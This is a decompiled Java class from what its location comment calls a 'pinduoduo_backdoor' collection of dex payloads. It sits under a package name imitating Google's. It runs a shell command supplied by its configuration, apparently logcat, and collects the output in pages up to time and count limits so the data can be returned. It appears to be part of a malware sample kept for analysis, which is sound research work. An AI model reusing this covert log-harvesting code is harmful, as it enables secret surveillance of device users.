package com.google.android.sd.biz_dynamic_dex.td.logcat.c.b.a;

import android.content.Context;
import com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.a;
import com.google.android.sd.utils.IoUtils;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public final class b implements a.a {
  public static a a;
  
  private final Context b;
  
  private final c c;
  
  private StringBuilder d = new StringBuilder();
  
  private StringBuilder e = new StringBuilder();
  
  private int f = 0;
  
  private int g = 0;
  
  private boolean h = true;
  
  private Process i;
  
  private InputStreamReader j = null;
  
  private BufferedReader k = null;
  
  public b(Context paramContext, c paramc) {
    this.b = paramContext;
    this.c = paramc;
  }
  
  private void b() {
    Exception exception;
    /* monitor enter ThisExpression{ObjectType{com/google/android/sd/biz_dynamic_dex/td/logcat/c/b/a/b}} */
    try {
      com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.b.a("pre_do_finish_work");
      if (!this.h)
        this.h = true; 
      Process process = this.i;
      if (process != null) {
        process.destroy();
        this.i = null;
      } 
      InputStreamReader inputStreamReader = this.j;
      if (inputStreamReader != null) {
        IoUtils.closeQuietly(inputStreamReader);
        this.j = null;
      } 
      BufferedReader bufferedReader = this.k;
      if (bufferedReader != null) {
        IoUtils.closeQuietly(bufferedReader);
        this.k = null;
      } 
      /* monitor exit ThisExpression{ObjectType{com/google/android/sd/biz_dynamic_dex/td/logcat/c/b/a/b}} */
      return;
    } catch (Exception null) {
      com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.b.a("pre_do_finish_error_".concat(String.valueOf(exception)));
      /* monitor exit ThisExpression{ObjectType{com/google/android/sd/biz_dynamic_dex/td/logcat/c/b/a/b}} */
      return;
    } finally {}
    /* monitor exit ThisExpression{ObjectType{com/google/android/sd/biz_dynamic_dex/td/logcat/c/b/a/b}} */
    throw exception;
  }
  
  public final a a() {
    // Byte code:
    //   0: aload_0
    //   1: iconst_0
    //   2: putfield h : Z
    //   5: aload_0
    //   6: getfield b : Landroid/content/Context;
    //   9: aload_0
    //   10: getfield c : Lcom/google/android/sd/biz_dynamic_dex/td/logcat/c/b/a/c;
    //   13: getfield a : J
    //   16: ldc2_w 1000
    //   19: lmul
    //   20: aload_0
    //   21: invokestatic a : (Landroid/content/Context;JLcom/google/android/sd/biz_dynamic_dex/td/logcat/a/b/a$a;)V
    //   24: aload_0
    //   25: getfield b : Landroid/content/Context;
    //   28: astore #8
    //   30: aload_0
    //   31: getfield c : Lcom/google/android/sd/biz_dynamic_dex/td/logcat/c/b/a/c;
    //   34: astore #9
    //   36: invokestatic currentTimeMillis : ()J
    //   39: lstore #4
    //   41: aload #9
    //   43: getfield a : J
    //   46: lstore #6
    //   48: aload #9
    //   50: getfield b : I
    //   53: istore_1
    //   54: aload #9
    //   56: getfield c : I
    //   59: istore_2
    //   60: aload #9
    //   62: getfield d : Ljava/lang/String;
    //   65: astore #9
    //   67: aload_0
    //   68: invokestatic getRuntime : ()Ljava/lang/Runtime;
    //   71: iconst_3
    //   72: anewarray java/lang/String
    //   75: dup
    //   76: iconst_0
    //   77: ldc 'sh'
    //   79: aastore
    //   80: dup
    //   81: iconst_1
    //   82: ldc '-c'
    //   84: aastore
    //   85: dup
    //   86: iconst_2
    //   87: aload #9
    //   89: aastore
    //   90: invokevirtual exec : ([Ljava/lang/String;)Ljava/lang/Process;
    //   93: putfield i : Ljava/lang/Process;
    //   96: aload_0
    //   97: new java/io/InputStreamReader
    //   100: dup
    //   101: aload_0
    //   102: getfield i : Ljava/lang/Process;
    //   105: invokevirtual getInputStream : ()Ljava/io/InputStream;
    //   108: invokespecial <init> : (Ljava/io/InputStream;)V
    //   111: putfield j : Ljava/io/InputStreamReader;
    //   114: aload_0
    //   115: new java/io/BufferedReader
    //   118: dup
    //   119: aload_0
    //   120: getfield j : Ljava/io/InputStreamReader;
    //   123: invokespecial <init> : (Ljava/io/Reader;)V
    //   126: putfield k : Ljava/io/BufferedReader;
    //   129: ldc 'pre_start_catch'
    //   131: invokestatic a : (Ljava/lang/String;)V
    //   134: aload_0
    //   135: getfield h : Z
    //   138: ifne -> 332
    //   141: aload_0
    //   142: getfield k : Ljava/io/BufferedReader;
    //   145: invokevirtual readLine : ()Ljava/lang/String;
    //   148: astore #9
    //   150: aload #9
    //   152: invokestatic isEmpty : (Ljava/lang/CharSequence;)Z
    //   155: ifeq -> 164
    //   158: invokestatic c : ()V
    //   161: goto -> 134
    //   164: aload_0
    //   165: getfield e : Ljava/lang/StringBuilder;
    //   168: astore #10
    //   170: aload #10
    //   172: ldc '\\n'
    //   174: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   177: pop
    //   178: aload #10
    //   180: aload #9
    //   182: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   185: pop
    //   186: ldc '【append】'
    //   188: aload #9
    //   190: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   193: invokevirtual concat : (Ljava/lang/String;)Ljava/lang/String;
    //   196: pop
    //   197: invokestatic c : ()V
    //   200: aload_0
    //   201: getfield g : I
    //   204: iconst_1
    //   205: iadd
    //   206: istore_3
    //   207: aload_0
    //   208: iload_3
    //   209: putfield g : I
    //   212: iload_3
    //   213: iload_2
    //   214: if_icmplt -> 301
    //   217: aload_0
    //   218: getfield e : Ljava/lang/StringBuilder;
    //   221: ifnull -> 259
    //   224: aload_0
    //   225: getfield d : Ljava/lang/StringBuilder;
    //   228: ifnull -> 259
    //   231: ldc 'pre_append_data'
    //   233: invokestatic a : (Ljava/lang/String;)V
    //   236: aload_0
    //   237: getfield d : Ljava/lang/StringBuilder;
    //   240: aload_0
    //   241: getfield e : Ljava/lang/StringBuilder;
    //   244: invokevirtual append : (Ljava/lang/CharSequence;)Ljava/lang/StringBuilder;
    //   247: pop
    //   248: aload_0
    //   249: new java/lang/StringBuilder
    //   252: dup
    //   253: invokespecial <init> : ()V
    //   256: putfield e : Ljava/lang/StringBuilder;
    //   259: aload_0
    //   260: iconst_0
    //   261: putfield g : I
    //   264: aload_0
    //   265: getfield f : I
    //   268: iconst_1
    //   269: iadd
    //   270: istore_3
    //   271: aload_0
    //   272: iload_3
    //   273: putfield f : I
    //   276: iload_3
    //   277: iload_1
    //   278: if_icmplt -> 301
    //   281: ldc 'pre_stop_logcat_for_max_page'
    //   283: invokestatic a : (Ljava/lang/String;)V
    //   286: aload #8
    //   288: ldc '8'
    //   290: invokestatic b : (Landroid/content/Context;Ljava/lang/String;)V
    //   293: aload_0
    //   294: iconst_1
    //   295: putfield h : Z
    //   298: goto -> 332
    //   301: invokestatic currentTimeMillis : ()J
    //   304: lload #4
    //   306: lsub
    //   307: lload #6
    //   309: ldc2_w 1000
    //   312: lmul
    //   313: lcmp
    //   314: ifle -> 134
    //   317: ldc 'pre_stop_logcat_for_max_time_loop'
    //   319: invokestatic a : (Ljava/lang/String;)V
    //   322: aload #8
    //   324: ldc '8'
    //   326: invokestatic b : (Landroid/content/Context;Ljava/lang/String;)V
    //   329: goto -> 293
    //   332: aload_0
    //   333: invokespecial b : ()V
    //   336: goto -> 362
    //   339: astore #8
    //   341: goto -> 448
    //   344: astore #8
    //   346: ldc 'pre_catch_logcat_error_'
    //   348: aload #8
    //   350: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   353: invokevirtual concat : (Ljava/lang/String;)Ljava/lang/String;
    //   356: invokestatic a : (Ljava/lang/String;)V
    //   359: goto -> 332
    //   362: aload_0
    //   363: getfield g : I
    //   366: ifgt -> 386
    //   369: aload_0
    //   370: getfield f : I
    //   373: ifle -> 379
    //   376: goto -> 386
    //   379: ldc 'pre_not_collect'
    //   381: invokestatic a : (Ljava/lang/String;)V
    //   384: aconst_null
    //   385: areturn
    //   386: ldc 'pre_collect'
    //   388: invokestatic a : (Ljava/lang/String;)V
    //   391: aload_0
    //   392: getfield b : Landroid/content/Context;
    //   395: ldc '9'
    //   397: invokestatic b : (Landroid/content/Context;Ljava/lang/String;)V
    //   400: new com/google/android/sd/biz_dynamic_dex/td/logcat/c/b/a/a
    //   403: dup
    //   404: invokespecial <init> : ()V
    //   407: astore #8
    //   409: aload #8
    //   411: aload_0
    //   412: getfield d : Ljava/lang/StringBuilder;
    //   415: putfield a : Ljava/lang/StringBuilder;
    //   418: aload #8
    //   420: aload_0
    //   421: getfield e : Ljava/lang/StringBuilder;
    //   424: putfield b : Ljava/lang/StringBuilder;
    //   427: aload #8
    //   429: aload_0
    //   430: getfield g : I
    //   433: putfield d : I
    //   436: aload #8
    //   438: aload_0
    //   439: getfield f : I
    //   442: putfield c : I
    //   445: aload #8
    //   447: areturn
    //   448: aload_0
    //   449: invokespecial b : ()V
    //   452: aload #8
    //   454: athrow
    //   455: astore #8
    //   457: ldc 'pre_do_start_error_'
    //   459: aload #8
    //   461: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   464: invokevirtual concat : (Ljava/lang/String;)Ljava/lang/String;
    //   467: invokestatic a : (Ljava/lang/String;)V
    //   470: aconst_null
    //   471: areturn
    // Exception table:
    //   from	to	target	type
    //   0	36	455	java/lang/Exception
    //   36	134	344	java/lang/Exception
    //   36	134	339	finally
    //   134	161	344	java/lang/Exception
    //   134	161	339	finally
    //   164	212	344	java/lang/Exception
    //   164	212	339	finally
    //   217	259	344	java/lang/Exception
    //   217	259	339	finally
    //   259	276	344	java/lang/Exception
    //   259	276	339	finally
    //   281	293	344	java/lang/Exception
    //   281	293	339	finally
    //   293	298	344	java/lang/Exception
    //   293	298	339	finally
    //   301	329	344	java/lang/Exception
    //   301	329	339	finally
    //   332	336	455	java/lang/Exception
    //   346	359	339	finally
    //   362	376	455	java/lang/Exception
    //   379	384	455	java/lang/Exception
    //   386	445	455	java/lang/Exception
    //   448	455	455	java/lang/Exception
  }
  
  public final void a(Context paramContext) {
    try {
      com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.b.a("pre_stop_logcat_for_max_time");
      this.h = true;
      b();
      return;
    } catch (Exception exception) {
      com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.b.a("pre_on_proguard_error".concat(String.valueOf(exception)));
      return;
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\2aa151e2cfa04acb8fb96e523807ca6b-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\td\logcat\c\b\a\b.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */